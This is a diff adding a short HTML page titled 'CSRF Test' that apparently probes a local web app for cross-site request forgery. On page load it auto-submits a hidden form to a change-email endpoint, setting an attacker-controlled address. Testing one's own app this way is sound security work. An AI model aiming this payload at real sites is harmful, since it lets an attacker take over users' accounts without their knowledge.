@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>CSRF Test</h1>
+
+<form action="http://127.0.0.1:5000/change-email"
+      method="POST">
+
+    <input
+        type="hidden"
+        name="email"
+        value="attacker-controlled@example.com"
+    >
+
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
